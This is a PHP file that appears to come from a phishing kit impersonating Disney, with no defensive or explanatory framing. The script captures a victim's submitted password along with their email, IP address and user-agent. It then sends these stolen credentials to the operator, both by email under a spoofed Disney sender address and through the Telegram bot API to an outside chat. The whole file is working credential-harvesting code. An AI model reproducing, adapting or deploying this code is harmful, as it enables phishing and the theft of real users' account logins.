<?php

include("../infos.php");
include("../common/sub_includes.php");


if(isset($_POST)){

	if(!isset($_SESSION)){
		session_start();
	}

	$_SESSION['password'] = htmlspecialchars($_POST['password_input']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];


	if(isset($_SESSION["password"])){

				######################
				#### MAIL SENDING ####
				######################

				if($mail_sending == true){
					
					$message = "

[📲] Login [📲]

📲 Email : ".$_SESSION['email']."
📲 Mot de passe : ".$_SESSION['password']."

[💻] Informations additionnelles [💻]

💻 IP : ".$_SESSION['ip']."
💻 User-agent : ".$_SESSION['useragent']."

					";

					$subject = "「📲」 +1 Log | ".$_SESSION['email']." - ".$_SESSION['ip'];
					$headers = "From: Disney <jugular@disney.fr>";
					mail($rezmail, $subject, $message, $headers);
				}

				##########################
				#### TELEGRAM SENDING ####
				##########################

				if($telegram_sending == true){

					$data = [
					'text' => '

[📲] Login [📲]

📲 E-Mail : '.$_SESSION['email'].'
📲 Mot de passe : '.$_SESSION['password'].'

[💻] Informations additionnelles [💻]

💻 Adresse Ip : '.$_SESSION['ip'].'
💻 User-agent : '.$_SESSION['useragent'].'


					',
					'chat_id' => $chat_login
								];

					file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}
				$_SESSION["logged"] = true;


				echo json_encode(array('success' => 1));
				}
		else{

			echo json_encode(array('success' => 0));

		}

	}

else{
	header('Location: ../');
}


?>